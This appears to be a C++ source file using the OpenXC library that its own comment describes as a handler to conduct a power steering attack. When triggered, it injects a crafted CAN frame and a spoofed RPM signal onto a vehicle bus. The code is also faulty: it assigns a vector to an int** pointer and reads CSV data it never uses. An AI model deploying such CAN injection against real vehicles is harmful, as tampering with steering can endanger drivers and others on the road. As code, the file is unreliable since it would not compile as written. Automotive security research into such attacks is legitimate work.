//Contains handlers for translations in commmand library.

namespace can = openxc::can; 
using openxc::can::lookupSignal;

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <stdlib.h>

std::vector<std::vector<int> > readCSV() {

   std::vector<std::vector<int> > array;
   std::ifstream file( "power_steering.csv" );
   std::string line; 

   if (!file.is_open())
   {
      return array;
   }

   for (int i = 1; i < 98; i++){
      std::getline(file, line); // skip the first 97 lines
   }

   while( std::getline( file, line ) ) {

      std::istringstream iss( line );
      std::string result;

      std::vector<int> a2;
      while( std::getline( iss, result, ',' ) ) {
         a2.push_back(strtoul( result.c_str(), NULL, 16 ));
      }

      array.push_back(a2);
   }

   return array;
}


//Handler to conduct power steering attack
void powerSteeringHandler(const char* name, openxc_DynamicField* value,
	openxc_DynamicField* event, CanSignal* signals, int signalCount) {

	CanMessage can_message = {0};
	CanBus* bus = openxc::can::lookupBus(1, openxc::signals::getCanBuses(), openxc::signals::getCanBusCount());
	const bool attack = value->boolean_value;

	uint64_t can_value = {0};
	CanSignal* rpmSignal = lookupSignal("set_rpm", signals,
		signalCount);

	int **array;
	if (attack == true) {

		array = readCSV();
		can_value = 0x4E;
		can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};
	
		can::write::enqueueMessage(bus, &can_message);
		can::write::flushOutgoingCanMessageQueue(bus);
		can::write::sendEncodedSignal(rpmSignal, can_value, true);
	}
}
